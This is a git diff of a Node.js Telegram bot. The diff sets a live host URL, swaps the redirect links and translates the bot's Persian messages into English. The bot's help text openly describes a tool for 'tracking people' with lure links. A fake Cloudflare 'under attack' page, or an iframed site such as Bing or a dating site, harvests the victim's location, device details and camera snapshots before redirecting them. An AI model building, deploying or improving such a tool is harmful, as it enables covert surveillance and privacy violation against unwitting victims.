@@ -14,9 +14,9 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="YOUR URL";
-//TOGGLE for 1pt Proxy and Shorters
-var use1pt=true;
+var hostURL="https://wbcamloc-6.brhymjaafrpwr.repl.co";
+//TOGGLE for Shorters
+var use1pt=false;
 
 
 
@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/NiCodeTeam");
+res.redirect("https://t.me/Nimajafarpor");
 }
 
          
@@ -48,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/NiCodeTeam");
+res.redirect("https://t.me/");
 }
 
          
@@ -62,7 +62,7 @@ const chatId = msg.chat.id;
 
  
 
-if(msg?.reply_to_message?.text=="🌐 وبسایت مدنظر خود را وارد بکنید"){
+if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
  createLink(chatId,msg.text); 
 }
   
@@ -71,20 +71,20 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nشما می توانید از این ربات برای ردیابی افراد فقط از طریق یک لینک ساده استفاده کنید.\nمی تواند اطلاعاتی مانند مکان، اطلاعات دستگاه، عکس های دوربین را جمع آوری کند.\n\nبرای اطلاعات بیشتر، /help را تایپ کنید.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` از طریق این ربات می توانید افراد را فقط با ارسال یک لینک ساده ردیابی کنید.\n\nSend /create
-برای شروع، سپس از شما یک URL می خواهد که در iframe برای فریب دادن قربانیان استفاده می شود.\nبعد از دریافت
-آدرس اینترنتی 2 پیوند را برای شما ارسال می کند که می توانید از آنها برای ردیابی افراد استفاده کنید.
-\n\nمشخصات فنی.
-\n1. پیوند Cloudflare: این روش یک صفحه تحت حمله cloudflare را برای جمع آوری اطلاعات نشان می دهد و پس از آن قربانی به URL مقصد هدایت می شود.
-\n2. پیوند وب ویو: این یک وب سایت (بینگ سابق، سایت های دوستیابی و غیره) را نشان می دهد که از iframe برای جمع آوری اطلاعات استفاده می کند.
-( ⚠️ بسیاری از سایت‌ها ممکن است تحت این روش کار نکنند، اگر هدر x-frame را داشته باشند https://google.com)
-\n\n
+bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
+to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
+the url it will send you 2 links which you can use to track people.
+\n\nSpecifications.
+\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
+\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
+( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
+\n\nThe project is OSS at: @Nimajafarpor
 `);
 }
   
@@ -115,7 +115,7 @@ if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https'
 var url=cid.toString(36)+'/'+btoa(msg);
 var m={
   reply_markup:JSON.stringify({
-    "inline_keyboard":[[{text:"لینک جدید ایجاد کنید",callback_data:"crenew"}]]
+    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
   } )
 };
 
@@ -137,17 +137,15 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `پیوندهای جدید با موفقیت ایجاد شد \nURL: ${msg}\n\n✅پیوندهای شما\n\n🌐 پیوند صفحه CloudFlare\n${f}\n\n🌐 لینک صفحه نمایش وب\n${g}`,m);
+bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
 else{
 
-bot.sendMessage(cid, `پیوندهای جدید با موفقیت ایجاد شد.\nURL: ${msg}\n\n✅پیوندهای شما\n\n🌐 پیوند صفحه CloudFlare\n${cUrl}\n\n🌐 لینک صفحه نمایش وب\n${wUrl}`,m);
+bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
 }
 }
 else{
-bot.sendMessage(cid,`⚠️ لطفا با پروتکل 
-http - https 
-وارد بکنید`);
+bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
 createNew(cid);
 
 }  
@@ -158,7 +156,7 @@ function createNew(cid){
 var mk={
 reply_markup:JSON.stringify({"force_reply":true})
 };
-bot.sendMessage(cid,`🌐 URL خود را وارد کنید`,mk);
+bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
 }
 
 
